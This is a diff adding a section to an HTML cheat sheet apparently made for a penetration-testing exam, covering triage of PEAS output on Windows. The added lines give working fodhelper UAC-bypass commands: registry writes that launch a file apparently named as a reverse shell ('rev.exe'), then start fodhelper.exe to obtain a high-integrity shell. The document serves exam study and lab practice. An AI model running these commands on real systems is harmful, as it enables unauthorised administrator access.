@@ -141,6 +141,15 @@ Set <b>&lt;KALI&gt;</b> = your tun0 IP. Full detail: <b>exam-harness/USAGE.md</b
 
 <section><div class=head><span class=num>4·5</span><h2>PEAS triage — reading the output</h2><span class=tag>no AI needed</span></div>
 <div class=body>
+<p class=note><b>⚡ FIRST, before reading anything: am I already admin?</b> On any Windows foothold run <code>whoami /groups</code>. If you see <b>Administrators</b> + <b>Medium</b> Mandatory Level (winPEAS: user in Administrators but <code>HighIntegrity: False</code>) → it's a <b>UAC bypass</b>, NOT a privesc hunt. Skip the whole service/DLL/token scroll.</p>
+<pre>
+<span class=cmd>whoami /groups | findstr /i "High Mandatory"<span class=c>   # High = done; Medium = UAC bypass</span></span>
+<span class="cmd nop c"># fodhelper UAC bypass (no binary drop, no Metasploit):</span>
+<span class=cmd>reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "cmd.exe /c C:\Windows\Temp\rev.exe" /f</span>
+<span class=cmd>reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f</span>
+<span class=cmd>start fodhelper.exe<span class=c>   # catch HIGH-integrity shell; then: reg delete "HKCU\Software\Classes\ms-settings" /f</span></span>
+</pre>
+<p class=note><b>Note:</b> a filtered medium-integrity admin token has <b>no SeImpersonate</b> — Potato attacks won't run until you've bypassed UAC. That's expected, not a dead end.</p>
 <p class=note><b>Overwhelmed?</b> Open <code>docs/Triage.html</code> (offline, exam-legal), paste the raw PEAS dump, read the top-ranked findings. It's just a highlighter — allowed.</p>
 <p class=note><b>Read by color, pass one:</b> 🟥 RED+YELLOW highlight = ~95% exploitable → act first. Red alone = worth a look. Green/white = skip until stuck.</p>
 <pre>
